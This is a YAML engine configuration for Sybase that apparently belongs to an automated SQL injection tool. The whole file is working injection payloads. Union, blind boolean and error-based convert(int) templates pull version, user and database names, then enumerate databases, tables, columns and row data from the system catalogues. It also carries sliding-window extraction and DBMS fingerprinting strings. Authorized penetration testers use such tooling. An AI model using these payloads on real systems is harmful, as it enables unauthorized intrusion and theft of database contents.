engine: Sybase

resource:
 info: |
  select
      %2B@@version
      %2B'${enclose_value_sql}'
      %2Bdb_name()
      %2B'${enclose_value_sql}'
      %2Buser_name()
      %2B'${trail_sql}'
      r

 schema:
  database: |
   select
       rr
       %2b'${trail_sql}'
       r
   from (
       /* isnull(min) with null enforcing single query result for proper trail */
       select isnull(
           min(
               '${enclose_value_sql}'
               %2bt.name
               %2b'${separator_qte_sql}0${enclose_value_sql}'
           ),
           null
       ) rr
       from master..sysdatabases t
       where ${limit} = (
           select count(*) from master..sysdatabases t1 where t.name >= t1.name
       ) 
   ) a

  table: |
   select
       rr
       %2b'${trail_sql}'
       r
   from (
       select isnull(
           min(
               '${enclose_value_sql}'
               %2bt.name
               %2b'${separator_qte_sql}0${enclose_value_sql}'
           ),
           null
       ) rr
       from ${database}..sysobjects t
       where ${limit} = (
           select count(*) from ${database}..sysobjects t1 where t.name >= t1.name and t1.type != 'P'
       )
   ) a

  column: |
   select
       rr
       %2b'${trail_sql}'
       r
   from (
       select isnull(
           min(
               '${enclose_value_sql}'
               %2bt.name
               %2b'${separator_qte_sql}0${enclose_value_sql}'
           ),
           null
       ) rr
       from ${database}..syscolumns t
       where ${limit} = (
           select count(*) from ${database}..syscolumns c2 inner join ${database}..sysobjects t2
           on c2.id = t2.id and c2.id = t.id
           where t2.name = '${table}'
           and t.name >= c2.name
       )
   ) a

  row:
   query: |
    select
        rr
        %2b'${trail_sql}'
        r
    from (
        select isnull(
           min(
               '${enclose_value_sql}'
               %2bt.s
               %2b'${separator_qte_sql}0${enclose_value_sql}'),
           null
        ) rr
        from (select distinct ${fields} s from ${database}..${table}) t
        where ${limit} = (
           select count(*)
           from (select distinct ${fields} s from ${database}..${table}) t1
           where t.s >= t1.s
        )
    ) a
   fields:
    field: |
     rtrim(
         ltrim(
             convert(
                 varchar,
                 ${field.value}
             )
         )
     )
    concat: "%2b '%7f' %2b"

strategy:
 configuration:
  slidingWindow: |
   select
       '${lead}'
       %2bsubstring(
           r,
           ${window.char},
           65536
       )
   from (
       ${injection}
   ) x
  limit: ${limit.value}
  failsafe: |
   select
       convert(
           varchar,
           (1337${indice}7330%2b1)
       ) r
  calibrator: replicate('${calibrator_sql}', 1024)
  limitBoundary: 1
  endingComment: --+-
  fingerprint:
   errorMessage:
    - "Warning: sybase_connect()"
    - "Warning: sybase_query()"
    - "Warning: sybase_fetch_row()"
    - "Sybase: Server message:"
    - Invalid SQL statement or JDBC escape, terminating '
    - sybase
   # add @@version to fix collision with virtuoso
   engineSpecific: "'a' = case when ${test} then 'a' else show_sec_services() %2b @@version end"

 binary:
  test:
   bit: |
    0 != ascii(substring(
        (${injection}),
        ${window.char},
        1
    ))
    %26${bit}
   bin: |
    substring(
        (${injection}),
        ${window.char},
        1
    )
    %3E%3Dchar(${mid.int})
  modeAnd: and
  modeOr: or
  blind: ${binary.mode} ${test}

 union:
  indices: union select ${result_range} from (${indice_unique}) b
  capacity: (select '${lead}${indice}' %2b ${calibrator})
  orderBy: order by 1337

 error:
  method:

   - name: convert:or
     query: |
      /* Syntax error during explicit conversion of VARCHAR value '<sqli>' to a INT field */
      or 1=convert(int, (${window}))
     capacity: 255

   - name: convert:and
     query: |
      and 1=convert(int, (${window}))
     capacity: 255

   - name: convert:none
     query: |
      1=convert(int, (${window}))
     capacity: 255